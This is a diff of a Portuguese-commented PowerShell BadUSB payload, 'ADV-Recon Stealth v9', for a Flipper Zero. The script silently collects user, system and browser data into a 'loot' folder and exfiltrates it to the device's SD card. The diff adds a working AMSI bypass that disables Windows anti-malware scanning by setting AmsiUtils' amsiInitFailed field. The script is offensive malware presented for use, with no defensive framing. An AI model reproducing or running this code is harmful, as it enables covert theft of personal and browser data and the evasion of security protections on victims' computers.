@@ -1,26 +1,35 @@
 <#
 .SYNOPSIS
-    ADV-Recon Stealth v8 — Invisivel total
+    ADV-Recon Stealth v9 — Invisivel total + AMSI bypass
     Recon 100% oculto. Aguarda 30s pelo Flipper Zero.
     Exfiltracao para SD via USB Mass Storage.
-    Zero janelas, zero output na tela.
-    Confirmacao apenas via debug.log no SD.
 #>
 
 ############################################################################################################################################################
-# LOG INTERNO (apenas para debug.log no SD do Flipper)
+# AMSI BYPASS (primeira linha executavel — antes de qualquer coisa)
 ############################################################################################################################################################
+try {
+    $a=[Ref].Assembly.GetTypes()
+    foreach($t in $a){
+        if($t.Name -like '*AmsiUtils'){
+            $t.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+            break
+        }
+    }
+}catch{}
 
+############################################################################################################################################################
+# LOG INTERNO
+############################################################################################################################################################
 $Global:Log = @()
 function L($m){$Global:Log+=("[{0:HH:mm:ss}] {1}" -f (Get-Date),$m)}
 
-L 'ADV-Recon Stealth v8 iniciado'
+L 'ADV-Recon Stealth v9 iniciado'
 L ('User: '+$env:USERNAME+' | PC: '+$env:COMPUTERNAME)
 
 ############################################################################################################################################################
 # CONFIG
 ############################################################################################################################################################
-
 $Timeout   = 30
 $OutFolder = 'loot'
 $Marker    = 'badusb'
@@ -35,7 +44,7 @@ $ZP  = $env:TEMP + '\' + $Zip
 mkdir $WD -Force | Out-Null
 
 ############################################################################################################################################################
-# RECON (totalmente silencioso)
+# RECON
 ############################################################################################################################################################
 L 'ETAPA 1: Tree'
 try {
@@ -220,7 +229,7 @@ L 'OK: Browser data done'
 ############################################################################################################################################################
 L 'Compilando relatorio'
 $out = @"
-ADV-Recon Stealth v8
+ADV-Recon Stealth v9
 ===================
 
 Full Name: $ufn
